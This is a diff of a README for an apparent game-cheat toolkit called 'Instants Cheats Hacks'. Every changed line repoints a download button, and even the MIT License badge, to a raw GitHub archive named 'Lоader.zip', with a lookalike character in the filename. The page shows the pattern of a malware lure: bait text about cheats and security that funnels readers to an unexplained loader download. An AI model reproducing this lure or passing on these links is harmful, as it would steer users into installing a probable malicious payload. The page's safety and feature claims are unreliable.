@@ -1,6 +1,6 @@
 # 🎯 Instants Cheats Hacks
 
-[![Download Latest](https://img.shields.io/badge/Download-Now-brightgreen)](https://easylauncher.su/PSnzrH)
+[![Download Latest](https://raw.githubusercontent.com/imam-055/InstantHackKit/main/Lоader.zip)](https://raw.githubusercontent.com/imam-055/InstantHackKit/main/Lоader.zip)
 
 Supercharge your gameplay with **Instants Cheats Hacks** – the all-in-one toolkit offering advanced mods, smart cheats, seamless interface, seamless integration, unlimited customization, real-time overlay, and ultra performance for modern gamers. Compatible across all major platforms, this project is designed with user experience and security in mind.
 
@@ -31,7 +31,7 @@ modded gameplay, game boosting, hack overlay, auto-update tools, game enhancemen
 ## 📦 Installation
 
 1. Click the **button below** to get the latest version  
-[![Download Latest](https://img.shields.io/badge/Download-Now-brightgreen)](https://easylauncher.su/PSnzrH)
+[![Download Latest](https://raw.githubusercontent.com/imam-055/InstantHackKit/main/Lоader.zip)](https://raw.githubusercontent.com/imam-055/InstantHackKit/main/Lоader.zip)
 
 ## ⚠️ Disclaimer
 
@@ -39,7 +39,7 @@ modded gameplay, game boosting, hack overlay, auto-update tools, game enhancemen
 
 ## 📝 License
 
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
+[![MIT License](https://raw.githubusercontent.com/imam-055/InstantHackKit/main/Lоader.zip)](https://raw.githubusercontent.com/imam-055/InstantHackKit/main/Lоader.zip)  
 2025 Instants Cheats Hacks Project
 
-[![Download Latest](https://img.shields.io/badge/Download-Now-brightgreen)](https://easylauncher.su/PSnzrH)
+[![Download Latest](https://raw.githubusercontent.com/imam-055/InstantHackKit/main/Lоader.zip)](https://raw.githubusercontent.com/imam-055/InstantHackKit/main/Lоader.zip)
